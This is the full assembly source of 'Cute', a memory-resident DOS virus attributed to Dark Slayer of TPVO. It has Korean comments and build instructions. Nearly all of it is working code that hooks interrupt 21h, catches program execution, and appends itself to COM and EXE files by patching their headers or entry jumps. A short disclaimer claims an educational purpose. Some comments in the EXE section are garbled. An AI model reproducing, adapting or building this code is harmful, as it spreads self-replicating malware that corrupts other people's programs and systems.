;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     Cute                                    \          \     \   \
;            by Dark Slayer of TPVO           \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Cute
; Author     : Dark Slayer of TPVO
; Origin     : Taiwan
; Type : Memory resident  COM
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 말라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; TPVO 의 Dark Slayer 가 제작한 바이러스이다.
;
;
;
;     실행 파일 만드는법
;
;         tasm /m cute.asm
;         tlink cute.obj
;         exe2com cute.exe cute.com
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;=========================== Begin Cute.asm ==================================

vir_size equ    offset vir_end-offset start     ;
mem_size equ    offset mem_end-offset start     ;

vir_addr equ    580h                            ; 기억장소에 상주할 위치

vir_mark equ    0e9h                            ;

        .286                            ; 286 이상 에서 작동
        .model  tiny
        .code
        org     0
start:
        push    es                      ;
        mov     di,vir_addr+2           ; DI = 582h
        xor     ax,ax                   ;
        mov     es,ax                   ; 0:vir_addr
        call    delta
delta:
        pop     si                      ; 바이러스 시작점 얻기
        sub     si,offset delta-2
        push    cs
        pop     ds
        std                             ; cmpsw 하면 -2 가 된다.
        cmpsw                           ; SI 는 바이러스 시작점이 되고
        cld                             ; DI 는 580h 가 된다.
        mov     cx,mem_size             ; 바이러스 길이
        rep     movsb                   ; 바이러스 --> 0000:0580h 로 복사
        je      run_host                ;

        mov     bx,vir_addr/10h         ; bx = segment
        mov     al,offset int21         ; ax = Int 21h 주소값
        xchg    ax,es:[bx+21h*4-vir_addr/10h]   ; Int 21h 가로채기
        stosw                           ; AX -> ES:DI
        xchg    bx,es:[bx+21h*4-vir_addr/10h+2] ;
        xchg    bx,ax                   ; 현재 DI 는 바이러스 끝부분이 되므로
        stosw                           ; Int 21h 주소 저장하는 곳에 위치해있다.
run_host:
        pop     es                      ; es 복구 (=PSP)
        lodsw                           ; si = si + 2
        lodsw                           ; si = si + 2
        cmp     sp,0fffch
        jb      exe_host                ; sp < 0fffch? 이면 EXE 파일 이다.
com_host:
        mov     di,100h                 ;
        push    di                      ; COM 앞부분 복구
        movsw                           ;
        movsw                           ; 4 바이트 복구
        ret                             ; CS:100h 로 이동
exe_host:
        lodsw                           ;
        xchg    di,ax                   ; EXE 값 복구
        mov     bx,es                   ; bx=es=psp segment
        lea     ax,[bx+di+10h]          ; ax= cs + psp segment + 10h
        push    ax                      ;
        lodsw                           ; ip 복사
        push    ax                      ;
        mov     ds,bx                   ; ds=bx=psp segment
        retf                            ; 원래 EXE CS:IP 로 점프

int21:
        cmp     ax,4b00h                ; 파일 실행인가 ?
        jne     i21_exit                ; 아니면 끝냄
        pusha
        push    ds es
        mov     ax,3d02h                ; 파일 오픈
        int     21h                     ;
        xchg    bx,ax                   ; BX = 파일 핸들
        push    cs cs
        pop     ds es                   ; ds=es=cs
        mov     ah,3fh                  ; 파일 읽기
        mov     cx,18h                  ; CX = 길이
        mov     dx,offset vir_end       ; DX = 버퍼
        int     21h                     ;
        mov     si,dx                   ;
        mov     di,offset host_4_bytes  ;
        mov     ax,4202h                ; 파일 끝으로 이동
        xor     cx,cx                   ;
        cwd                             ;
        int     21h                     ;
                                        ;
        mov     cl,vir_mark             ; 0xE9h
        cmp     byte ptr ds:[si],'M'    ; EXE 파일 인가 ?
        je      infect_exe              ;
infect_com:
        movsw                           ; SI = 버퍼
        movsw                           ; DI = 데이터 저장 버퍼
        xchg    cx,ax                   ; cl=vir mark=0e9h ( jmp code )
                                        ; ax = 파일 길이 을 서로 교환 한다.
        stosb                           ; AL (E9h) --> ES:DI
        xchg    cx,ax                   ;
        sub     ax,3                    ; JMP 값 계산
        stosw
        jmp     infect_common
infect_exe:
        cmp     word ptr ds:[di+4+2],200h-vir_size      ; offset 2=exe mod
        cmc                             ; 뵳뾚 exe mod<200h-vir_size메쁟 cmc
                                        ;   뱒棨Acf=0메_쁟 cf=1
        adc     word ptr ds:[di+4+4],0  ; exe sector=exe sector+cf
        mov     si,10h
        div     si                      ; dx:ax/10h -> dx=쬷쨵 (윯V計 ip 솯)
                                        ;              ax=썝쨵 (첄쀶/10h 쀀썝)
        sub     ax,ds:[di+4+8]          ; offset 8=첄Y쀀쀶 (벧 para 샳屢),
                                        ;   ax=ax-첄Y쀀쀶=윯V計 cs W욤
        xchg    dx,ds:[di+4+14h]        ; offset 14h=exe ip
        xchg    ax,ds:[di+4+16h]        ; offset 16h=distance of exe cs
        stosw                           ; exe cs
        xchg    dx,ax
        stosw                           ; exe ip
        add     di,12h                  ; offset 12h=check sum
infect_common:
        cmp     ds:[di],cl              ;
        je      close                   ;
        mov     ds:[di],cl              ; mark
        mov     ah,40h                  ; 바이러스 쓰기
        mov     cl,vir_size
        cwd
        int     21h                     ;
        mov     ax,4200h                ; 포인터 처음으로 이동
        xor     cx,cx
        int     21h                     ; 헤더 쓰기
        mov     ah,40h
        mov     cl,18h
        mov     dl,offset vir_end
        int     21h                     ;
close:
        mov     ah,3eh
        int     21h                     ; 파일 닫기
        pop     es ds
        popa
i21_exit:
        db      0eah                    ; 원래 인터럽트 21h 로 점프
mem_end:
old21   dw      ?,?                     ; Int 21h 값

host_4_bytes db 0cdh,20h,0,0            ; 앞부분
vir_end:
        end     start

